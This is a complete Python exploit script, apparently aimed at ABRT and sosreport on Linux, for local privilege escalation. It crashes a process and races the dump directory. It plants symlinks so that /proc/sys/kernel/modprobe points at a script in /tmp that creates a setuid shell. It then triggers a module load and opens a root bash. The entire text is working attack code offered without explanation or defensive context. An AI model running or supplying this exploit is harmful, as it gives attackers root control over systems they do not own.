
#!/usr/bin/python

import os,sys,glob,time,sys,socket

payload = "#!/bin/sh\ncp /bin/sh /tmp/sh\nchmod 6755 /tmp/sh\n"

pid = os.fork()

if pid == 0:
	os.execl("/usr/bin/sleep","sleep","100")

time.sleep(0.5)

print "crashing pid %d" % pid

os.kill(pid,11)

print "waiting for dump directory"

def waitpath(p):
	while 1:
		r = glob.glob(p)
		if len(r) > 0:
			return r
		time.sleep(0.05)	

dumpdir = waitpath("/var/tmp/abrt/cc*%d" % pid)[0]

print "dump directory: ", dumpdir

os.chdir(dumpdir)

print "waiting for sosreport directory"

sosreport = waitpath("sosreport-*")[0]

print "sosreport: ", sosreport

print "waiting for tmpfiles"
tmpfiles = waitpath("tmp*")

print "tmpfiles: ", tmpfiles

print "moving directory"

os.rename(sosreport, sosreport + ".old")
os.mkdir(sosreport)
os.chmod(sosreport,0777)

os.mkdir(sosreport + "/sos_logs")
os.chmod(sosreport + "/sos_logs",0777)

os.symlink("/proc/sys/kernel/modprobe",sosreport + "/sos_logs/sos.log")
os.symlink("/proc/sys/kernel/modprobe",sosreport + "/sos_logs/ui.log")

print "moving tmpfiles"

for x in tmpfiles:
	print "%s -> %s" % (x,x + ".old")
	os.rename(x, x + ".old")
	open(x, "w+").write("/tmp/hax.sh\n")
	os.chmod(x,0666)


os.chdir("/")

sys.stderr.write("waiting for sosreport to finish (can take several minutes)..")


def trigger():
	open("/tmp/hax.sh","w+").write(payload)
	os.chmod("/tmp/hax.sh",0755)
	try: socket.socket(socket.AF_INET,socket.SOCK_STREAM,132)
	except: pass
	time.sleep(0.5)
	try:
		os.stat("/tmp/sh")
	except:
		print "could not create suid"
		sys.exit(-1)
	print "success"
	os.execl("/tmp/sh","sh","-p","-c",'''echo /sbin/modprobe > /proc/sys/kernel/modprobe;rm -f /tmp/sh;python -c "import os;os.setresuid(0,0,0);os.execl('/bin/bash','bash');"''')
	sys.exit(-1)

for x in xrange(0,60*10):
	if "/tmp/hax" in open("/proc/sys/kernel/modprobe").read():
		print "done"
		trigger()
	time.sleep(1)
	sys.stderr.write(".")

print "timed out"